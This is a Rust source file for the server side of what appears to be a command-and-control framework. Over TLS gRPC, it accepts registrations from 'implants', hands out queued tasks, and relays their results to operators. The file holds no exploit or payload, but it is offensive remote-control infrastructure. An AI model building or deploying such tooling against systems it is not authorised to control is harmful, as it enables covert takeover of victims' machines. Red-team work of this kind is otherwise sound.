use crate::server::db;
use crate::share::{implantpb, Error};
use implantpb::implant_rpc_server::{ImplantRpc, ImplantRpcServer};
use implantpb::{Confirmation, Empty, Registration, TaskRequest, TaskResponse, TaskResult};
use std::net::SocketAddr;
use std::sync::Arc;
use tokio::sync::Mutex;
use tonic::transport::{Identity, Server, ServerTlsConfig};
use tonic::{Request, Response, Status};

// Listen for implants
pub struct Listener {
    pub uuid: uuid::Uuid,
    pub lhost: String,
    pub lport: u16,
}

impl Listener {
    pub fn new(
        addr: SocketAddr,
        db: Arc<Mutex<db::Db>>,
        pem: String,
        key: String,
    ) -> Result<Listener, Error> {
        // TODO: Auto generate certs instead of using hard-coded certs
        let cert =
            std::fs::read(pem.clone()).map_err(|e| Error::FileReadErr(pem, e.to_string()))?;
        let key = std::fs::read(key.clone()).map_err(|e| Error::FileReadErr(key, e.to_string()))?;
        let identity = Identity::from_pem(cert, key);

        let service = ImplantService::new(db);
        let tls_config = ServerTlsConfig::new().identity(identity);
        let svc = ImplantRpcServer::new(service);

        let server = Server::builder()
            .tls_config(tls_config)
            .map_err(|_| Error::ListenerStartErr(addr.ip().to_string(), addr.port()))?
            .add_service(svc)
            .serve(addr);

        tokio::spawn(async move { server.await });

        Ok(Listener {
            uuid: uuid::Uuid::new_v4(),
            lhost: addr.ip().to_string(),
            lport: addr.port(),
        })
    }
}

// Define gRPC methods
struct ImplantService {
    // Let the implants interact with the database
    db: Arc<Mutex<db::Db>>, // notifications_tx: SyncSender<TaskResult>
}

impl ImplantService {
    fn new(db: Arc<Mutex<db::Db>>) -> ImplantService {
        ImplantService { db }
    }
}

// Implement the protobuf services
#[tonic::async_trait]
impl ImplantRpc for ImplantService {
    // Let an implant register with the server
    async fn register(
        &self,
        request: Request<Registration>,
    ) -> Result<Response<Confirmation>, Status> {
        let request = request.into_inner();
        // Register the implant
        let implant_id = self
            .db
            .lock()
            .await
            .register_implant(request)
            .await
            .map_err(|_| Status::unavailable(""))?
            .to_string();

        let response = Confirmation { implant_id };

        Ok(Response::new(response))
    }

    // Let an implant retrieve a task
    async fn get_task(
        &self,
        request: Request<TaskRequest>,
    ) -> Result<Response<TaskResponse>, Status> {
        let implant_id = request.into_inner().implant_id;

        let task = self
            .db
            .lock()
            .await
            .search_task_by_implant(implant_id)
            .ok_or_else(|| Status::unavailable(""))?;

        Ok(Response::new(task))
    }

    // Let an implant return the results to the server
    async fn post_result(&self, request: Request<TaskResult>) -> Result<Response<Empty>, Status> {
        let task_result = request.into_inner();
        // Send the operator the notification
        let operator_id = self
            .db
            .lock()
            .await
            .pop_task(task_result.id.clone())
            .ok_or_else(|| Status::unavailable("Task not found"))?
            .operator_id
            .clone();

        self.db
            .lock()
            .await
            .push_notification(operator_id, task_result)
            .await
            .map_err(|_| Status::unavailable("No operator associated with task"))?;

        Ok(Response::new(Empty {}))
    }
}
